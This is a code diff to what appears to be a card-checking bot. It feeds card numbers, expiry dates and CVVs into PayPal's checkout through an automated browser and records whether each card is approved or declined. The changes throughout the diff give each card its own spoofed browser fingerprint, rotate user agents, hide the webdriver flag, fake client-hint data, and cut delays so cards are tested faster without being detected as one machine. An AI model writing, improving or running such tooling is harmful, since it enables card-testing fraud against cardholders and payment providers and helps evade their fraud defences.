@@ -171,12 +171,67 @@ async def _verdict_in_browser(cc, mm, yy, cvv, first, last, street, city, state,
         f"&locale.x=en_US&commit=true&env=production"
         f"&sdkMeta={sdk_meta}&disable-card=&token={order_id}")
 
-    ctx = await browser.new_context(user_agent=UA_LIST[0],
-                                    viewport={"width": 1280, "height": 1100},
-                                    locale="en-US")
+    # Every card gets a browser of its own and a fingerprint of its own,
+    # so no two cards look like the same computer asking and asking.
+    # The fingerprint is the one our own library makes, and it is made
+    # for this card.
+    _fp = None
+    try:
+        import sys as _sys
+        _bot_dir = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
+        if _bot_dir not in _sys.path:
+            _sys.path.insert(0, _bot_dir)
+        from browser_identity import new_fingerprint
+        _fp = new_fingerprint()
+    except Exception:
+        _fp = None
+
+    # A good user agent when there is not one to hand: a request that
+    # does not say which browser it is is turned away at once.
+    _ua = ""
+    if _fp is not None:
+        _ua = str(getattr(_fp, "user_agent", "") or "")
+    if not _ua and UA_LIST:
+        _ua = random.choice(UA_LIST)
+    if not _ua:
+        try:
+            from browser_identity import good_user_agent
+            _ua = good_user_agent()
+        except Exception:
+            _ua = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
+                   "AppleWebKit/537.36 (KHTML, like Gecko) "
+                   "Chrome/136.0.0.0 Safari/537.36")
+    _lang = (_fp.accept_language if _fp is not None else "en-US,en;q=0.9")
+    _locale = str(_lang).split(",")[0].split(";")[0] or "en-US"
+    _screen = getattr(_fp, "screen", None) or {}
+    try:
+        _width = int(_screen.get("width") or 1280)
+        _height = int(_screen.get("height") or 1100)
+    except Exception:
+        _width, _height = 1280, 1100
+    ctx = await browser.new_context(
+        user_agent=_ua,
+        viewport={"width": _width, "height": _height},
+        locale=_locale)
     await ctx.add_init_script(
         "Object.defineProperty(navigator,'webdriver',{get:()=>undefined});")
     page = await ctx.new_page()
+    if _fp is not None:
+        # The marks of the browser are told to the page, so the page and
+        # the request say the same name.
+        try:
+            from browser_identity import (apply_browser_identity,
+                                          client_hints_metadata)
+            _res = apply_browser_identity(page, fingerprint=_fp)
+            if asyncio.iscoroutine(_res):
+                await _res
+            _ch = client_hints_metadata()
+            if _ch:
+                await page.add_init_script(
+                    "Object.defineProperty(navigator,'userAgentData',"
+                    "{get:()=>%s});" % _ch)
+        except Exception:
+            pass
     answers = []
 
     async def _on_response(resp):
@@ -196,8 +251,8 @@ async def _verdict_in_browser(cc, mm, yy, cvv, first, last, street, city, state,
     page.on("response", _on_response)
 
     try:
-        await page.goto(card_fields, wait_until="domcontentloaded", timeout=60000)
-        await asyncio.sleep(6)
+        await page.goto(card_fields, wait_until="domcontentloaded", timeout=25000)
+        await asyncio.sleep(1)
 
         for name, value in (("email", email), ("cardnumber", cc),
                             ("expiry-date", f"{mm}/{yy}"),
@@ -213,8 +268,8 @@ async def _verdict_in_browser(cc, mm, yy, cvv, first, last, street, city, state,
                 sel = page.locator('select[name="billingAddress.country"]').first
                 now = await sel.input_value()
                 if now.upper() != country:
-                    await sel.select_option(country, timeout=8000)
-                    await asyncio.sleep(2)
+                    await sel.select_option(country, timeout=6000)
+                    await asyncio.sleep(1)
             except Exception as e:
                 logger.info("paypal: the country would not go: %s", str(e)[:60])
 
@@ -228,8 +283,8 @@ async def _verdict_in_browser(cc, mm, yy, cvv, first, last, street, city, state,
                                 ("postcode", zipcode), ("phone", phone)):
                 try:
                     el = page.locator(f'input[name="{name}"]').first
-                    await el.click(timeout=6000)
-                    await el.fill(value, timeout=8000)
+                    await el.click(timeout=5000)
+                    await el.fill(value, timeout=6000)
                     await el.press("Tab", timeout=3000)
                 except Exception as e:
                     logger.info("paypal: the field %s would not take the text: %s",
@@ -240,11 +295,11 @@ async def _verdict_in_browser(cc, mm, yy, cvv, first, last, street, city, state,
             try:
                 sel = page.locator('select[name="state"]').first
                 if await sel.count():
-                    await sel.select_option(state, timeout=8000)
+                    await sel.select_option(state, timeout=6000)
             except Exception:
                 pass
 
-        await asyncio.sleep(2)
+        await asyncio.sleep(1)
         await page.keyboard.press("Escape")
 
         try:
@@ -264,7 +319,7 @@ async def _verdict_in_browser(cc, mm, yy, cvv, first, last, street, city, state,
             return None
 
         for _ in range(8):
-            await asyncio.sleep(1.5)
+            await asyncio.sleep(0.5)
             if answers:
                 break
 
@@ -536,7 +591,7 @@ async def paypal_check(cc, mm, yy, cvv, proxy=None):
     data_uid = _uid()
 
     client_kwargs = dict(
-        timeout=httpx.Timeout(45),
+        timeout=httpx.Timeout(20),
         follow_redirects=True,
         headers={"User-Agent": ua},
     )
@@ -767,7 +822,7 @@ async def paypal_check(cc, mm, yy, cvv, proxy=None):
                         verdict = ""
                         detail = ""
                         if attempt < 0:
-                            await asyncio.sleep(2)
+                            await asyncio.sleep(1)
                             continue
                         verdict = "declined"
                         detail = "Validation Error"
@@ -779,7 +834,7 @@ async def paypal_check(cc, mm, yy, cvv, proxy=None):
                 # page is opened again with a new order and a new number.
                 if attempt < 2:
                     logger.info("paypal gave no answer, trying again")
-                    await asyncio.sleep(3)
+                    await asyncio.sleep(0.5)
                     try:
                         r_again = await client.post(
                             "https://www.paypal.com/v2/checkout/orders",
